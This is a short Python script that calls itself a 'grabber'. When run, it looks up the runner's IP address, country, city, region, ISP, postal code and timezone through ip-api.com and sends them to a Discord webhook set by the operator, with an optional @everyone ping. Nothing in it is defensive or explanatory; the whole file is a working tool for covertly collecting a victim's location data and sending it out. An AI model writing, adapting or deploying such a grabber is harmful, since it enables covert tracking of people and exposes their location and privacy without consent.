import requests
from discord_webhook import DiscordWebhook


# Input your full webhook url here
WEBHOOK_URL = 'WEBHOOK_HERE'

# Pings everyone when someone runs the grabber
PING_ME = False


def main():

    response = requests.get("http://ip-api.com/json/").json()

    msg = "```𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐟𝐨𝐮𝐧𝐝:\n\nIP Address : " + response['query'] + "\n\nCountry : " + response['country'] + "\n\nCountry Code : " + response['countryCode'] + "\n\nCity : " + response['city'] + "\n\nRegion Name : " + response['regionName'] + "\n\nISP : " + response['isp'] + "\n\nPostal Code : " + response['zip'] + "\n\nTimezone : " + response['timezone'] + "```"

    url = WEBHOOK_URL

    ping = '@everyone' if PING_ME else ''

    settings = DiscordWebhook(url=url, content=ping +  msg)

    settings.execute()

main()